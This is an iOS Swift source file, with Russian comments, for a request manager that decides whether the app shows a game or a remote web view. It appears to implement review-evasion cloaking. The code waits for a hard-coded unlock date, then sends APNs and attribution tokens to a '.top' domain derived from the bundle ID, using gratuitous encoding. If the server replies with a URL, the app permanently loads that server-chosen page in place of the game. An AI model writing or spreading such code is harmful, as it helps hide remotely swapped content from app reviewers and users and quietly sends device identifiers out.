import SwiftUI
import AdServices
import UserNotifications


struct Urls: Decodable {
    let url1: String
    let url2: String

    
    init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicCodingKeys.self)
            self.url1 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl1)!)
            self.url2 = try container.decode(String.self, forKey: DynamicCodingKeys(stringValue: Constants.backUrl2)!)
        }
}

enum URLDecodingError: Error {
    case emptyParameters
    case invalidURL
    case emptyData
    case timeout
}

struct DynamicCodingKeys: CodingKey {
    var stringValue: String
    init?(stringValue: String) {
        self.stringValue = stringValue
    }
    
    var intValue: Int? { nil }
    init?(intValue: Int) { return nil }
}

final class Constants {
    static var backUrl1 = ""
    static var backUrl2 = ""
    static var unlockDate = ""

}


@MainActor
public final class RequestsManager {

    @ObservedObject var monitor = NetworkMonitor.shared
    private var networkService: INetworkService {
        return NetworkService()
    }
    
    private let urlStorageKey = "receivedURL"
    private var apnsToken: String?
    private var attToken: String?
    private var retryCount = 0
    private let maxRetryCount = 10
    private let retryDelay = 3.0
    
    public init(url1: String, url2: String, unlockDate: String) {
        Constants.backUrl1 = url1
        Constants.backUrl2 = url2
        Constants.unlockDate = unlockDate
    }
    
    
    
    public func getData() async {
     
        guard checkUnlockDate(Constants.unlockDate) else {
            failureLoading()
            
            return
        }
        
        // Проверка доступности интернета с повторными попытками
        if !monitor.isActive {
            await retryInternetConnection()
            return
        }
        
        if !isFirstLaunch() {
            handleStoredState()
            return
        }
        
        await getTokens()
        
        networkService.sendRequest(deviceData: getDeviceData()) { result in
            switch result {
            case .success(let url):
                self.handleFirstLaunchSuccess(url: url)
                self.sendNTFQuestionToUser()
            case .failure:
                self.handleFirstLaunchFailure()
            }
        }
    }
    
    // Новая функция для повторных попыток подключения к интернету
    private func retryInternetConnection() async {
        if retryCount >= maxRetryCount {
            print("Превышено максимальное количество попыток подключения к интернету (\(maxRetryCount))")
            print("Превышено максимальное количество попыток подключения к интернету")
            failureLoading()
            retryCount = 0 // Сбрасываем счетчик для будущих попыток
            return
        }
        
        retryCount += 1
        print("Нет подключения к интернету. Попытка \(retryCount) из \(maxRetryCount). Повторная проверка через \(Int(retryDelay)) сек...")
        print("Нет подключения к интернету. Попытка \(retryCount) из \(maxRetryCount). Повторная проверка через \(Int(retryDelay)) сек...")
        
        // Ожидаем указанное время перед повторной попыткой
        try? await Task.sleep(nanoseconds: UInt64(retryDelay * 1_000_000_000))
        
        // Повторная проверка интернета
        if monitor.isActive {
            print("Интернет подключен после попытки \(retryCount)")
            print("Интернет подключен после попытки \(retryCount)")
            retryCount = 0 // Сбрасываем счетчик, так как подключение восстановлено
            
            // Продолжаем выполнение основного кода
            if !isFirstLaunch() {
                handleStoredState()
            } else {
                await getTokens()
                
                networkService.sendRequest(deviceData: getDeviceData()) { result in
                    switch result {
                    case .success(let url):
                        self.handleFirstLaunchSuccess(url: url)
                        self.sendNTFQuestionToUser()
                    case .failure:
                        self.handleFirstLaunchFailure()
                    }
                }
            }
        } else {
            // Продолжаем попытки, если не достигли максимума
            await retryInternetConnection()
        }
    }
    
    private func getTokens() async {
        await withCheckedContinuation { continuation in
            DispatchQueue.main.async {
                UIApplication.shared.registerForRemoteNotifications()
            }
            
            let timeout = DispatchTime.now() + 10 // таймаут
            
            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] notification in
                guard let self = self else { return }
                
                if let token = notification.userInfo?["token"] as? String {
                    Task { @MainActor in
                        print("APNs токен получен")
                        self.apnsToken = token
                        continuation.resume()
                    }
                }
            }
            
            // таймер
            DispatchQueue.main.asyncAfter(deadline: timeout) { [weak self] in
                guard let self = self else { return }
                if self.apnsToken == nil { // Если токен не получен, возвращаем пустое значение
                    Task { @MainActor in
                        print("APNs токен не получен")
                        self.apnsToken = ""
                        continuation.resume()
                    }
                }
            }
        }

        do {
            self.attToken = try AAAttribution.attributionToken()
        } catch {
            print("Не удалось получить ATT токен: \(error)")
            self.attToken = ""
        }
    }

    
    func getDeviceData() -> [String: String] {
        let data = [
            "apns_token": apnsToken ?? "",
            "att_token": attToken ?? ""
        ]
        print("Device data: \(data)")
        return data
    }
    
    private func isFirstLaunch() -> Bool {
        !UserDefaults.standard.bool(forKey: "hasLaunchedBefore")
    }
    
    private func handleFirstLaunchSuccess(url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: urlStorageKey)
        UserDefaults.standard.set(true, forKey: "isShowWV")
        UserDefaults.standard.set(false, forKey: "isShowGame")
        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
        successLoading(object: url)
    }
    
    private func handleFirstLaunchFailure() {
        UserDefaults.standard.set(true, forKey: "isShowGame")
        UserDefaults.standard.set(false, forKey: "isShowWV")
        UserDefaults.standard.set(true, forKey: "hasLaunchedBefore")
        failureLoading()
    }
    
    private func handleStoredState() {
        if isShowWV(), let urlString = UserDefaults.standard.string(forKey: urlStorageKey), let url = URL(string: urlString) {
            successLoading(object: url)
        } else {
            failureLoading()
        }
    }
    
    func checkUnlockDate(_ date: String) -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        let currentDate = Date()
        guard let unlockDate = dateFormatter.date(from: date), currentDate >= unlockDate else {
            print("Дата разблокировки еще не наступила❌")
            return false
        }
        print("Приложение активно✅")
        return true
    }
    
    func isShowGame() -> Bool {
        UserDefaults.standard.bool(forKey: "isShowGame")
    }
    
    func isShowWV() -> Bool {
        UserDefaults.standard.bool(forKey: "isShowWV")
    }
    
    func sendNTFQuestionToUser() {
        
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {_, _ in }
        
      }
}


import Network
 

class NetworkMonitor: ObservableObject {
    static var shared = NetworkMonitor()
    let monitor = NWPathMonitor()
    let queue = DispatchQueue(label: "monitor")
    @Published var isActive = false
    @Published var isExpansive = false
    @Published var isConstrained = false
    @Published var connectionType = NWInterface.InterfaceType.other
    
    
    init() {
        monitor.pathUpdateHandler = { path in
            DispatchQueue.main.async {
                self.isActive = path.status == .satisfied
                self.isExpansive = path.isExpensive
                self.isConstrained = path.isConstrained
                
                let connectionTypes: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
                self.connectionType = connectionTypes.first(where: path.usesInterfaceType) ?? .other
            }
        }
        
        monitor.start(queue: queue)
    }
    
    
}


// Уведомления для UI
extension RequestsManager {
    func failureLoading() {
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .failUpload, object: nil)
            print("Запущена игра")
        }
    }
    
    func successLoading(object: URL) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .urlUpdated, object: object)
            print("Запущено вью")
        }
    }
}

// Уведомление о получении APNs токена
extension Notification.Name {
    static let apnsTokenReceived = Notification.Name("apnsTokenReceived")
}


protocol INetworkService: AnyObject {
    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
}




final class NetworkService: INetworkService {
    
    // получаем базовый url из бандла
    func getUrlFromBundle() -> String {
        guard let bundleId = Bundle.main.bundleIdentifier else { return "" }
        let cleanedString = bundleId.replacingOccurrences(of: ".", with: "")
        let stringUrl: String = "https://" + cleanedString + ".top/indexn.php"
        return stringUrl.lowercased()
    }
    
    // Кодирование URL в ASCII
    private func encodeToAscii(_ url: String) -> String {
        var result = ""
        for char in url {
            let scalar = char.unicodeScalars.first!
            result.append(String(format: "%%%02X", scalar.value))
        }
        return result
    }
    
    // Декодирование URL из ASCII
    private func decodeFromAscii(_ encoded: String) -> String? {
        var result = ""
        var i = encoded.startIndex
        
        while i < encoded.endIndex {
            if encoded[i] == "%" && i < encoded.index(encoded.endIndex, offsetBy: -2) {
                let start = encoded.index(i, offsetBy: 1)
                let end = encoded.index(i, offsetBy: 3)
                let hexString = String(encoded[start..<end])
                
                if let hexValue = UInt32(hexString, radix: 16),
                   let unicode = UnicodeScalar(hexValue) {
                    result.append(Character(unicode))
                    i = end
                } else {
                    return nil
                }
            } else {
                result.append(encoded[i])
                i = encoded.index(after: i)
            }
        }
        
        return result
    }
    
    private func getFinalUrl(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
        let queryItems = data.map { URLQueryItem(name: $0.key, value: $0.value) }
        var components = URLComponents()
        components.queryItems = queryItems
        
        guard let queryString = components.query?.data(using: .utf8) else {
            return nil
        }
        let base64String = queryString.base64EncodedString()
        
        // Получаем базовый URL и добавляем параметры
        let baseUrl = getUrlFromBundle()
        let fullUrlString = baseUrl + "?data=" + base64String
        print("🔹 Базовая ссылка: \(fullUrlString)")
        
        // Кодируем всю ссылку в ASCII
        let asciiEncodedUrl = encodeToAscii(fullUrlString)
        print("🔹 Кодированная ссылка: \(asciiEncodedUrl)")
        
        return (asciiEncodedUrl, fullUrlString)
    }
    
    func decodeJsonData(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
        do {
            let decodedData = try JSONDecoder().decode(Urls.self, from: data)
            
            guard !decodedData.url1.isEmpty, !decodedData.url2.isEmpty else {
                completion(.failure(URLDecodingError.emptyParameters))
                return
            }
            
            let fullUrlString = "https://" + decodedData.url1 + decodedData.url2
            
            // Кодируем ответный URL в ASCII
            let asciiEncodedUrl = encodeToAscii(fullUrlString)
            
            completion(.success((asciiEncodedUrl, fullUrlString)))
        } catch {
            UserDefaults.standard.setValue(true, forKey: "openedOnboarding")
            completion(.failure(error))
        }
    }
    
    func sendRequest(deviceData: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
        print("🔹 APNS Token: \(deviceData["apns_token"] ?? "")")
        print("🔹 ATT Token: \(deviceData["att_token"] ?? "")")
        
        // Получаем зашифрованный и оригинальный URL
        guard let urlTuple = getFinalUrl(data: deviceData) else {
            completion(.failure(URLDecodingError.invalidURL))
            return
        }
        
        let encodedUrl = urlTuple.encodedUrl
        
        // Расшифровываем URL перед отправкой запроса
        guard let decodedUrl = decodeFromAscii(encodedUrl) else {
            completion(.failure(URLDecodingError.invalidURL))
            return
        }
        
        guard let actualUrl = URL(string: decodedUrl) else {
            completion(.failure(URLDecodingError.invalidURL))
            return
        }
        
        // Создаем конфигурацию сессии
        let configuration = URLSessionConfiguration.default
        configuration.timeoutIntervalForRequest = 5
        let session = URLSession(configuration: configuration)
        
        // Отправляем запрос на декодированный URL
        let task = session.dataTask(with: actualUrl) { data, response, error in
            if let error = error as NSError?,
               error.code == NSURLErrorTimedOut {
                completion(.failure(URLDecodingError.timeout))
                return
            }
            
            if let data = data {
                self.decodeJsonData(data: data) { result in
                    switch result {
                        case .success(let urlTuple):
                            // Извлекаем оригинальный URL из ответа
                            if let finalUrl = URL(string: urlTuple.originalUrl) {
                                completion(.success(finalUrl))
                            } else {
                                completion(.failure(URLDecodingError.invalidURL))
                            }
                        case .failure(let error):
                            completion(.failure(error))
                    }
                }
            } else {
                completion(.failure(URLDecodingError.emptyData))
            }
        }
        
        task.resume()
    }
}

extension Notification.Name {
    static let urlUpdated = Notification.Name("urlUpdated")
    static let failUpload = Notification.Name("failUpload")
}
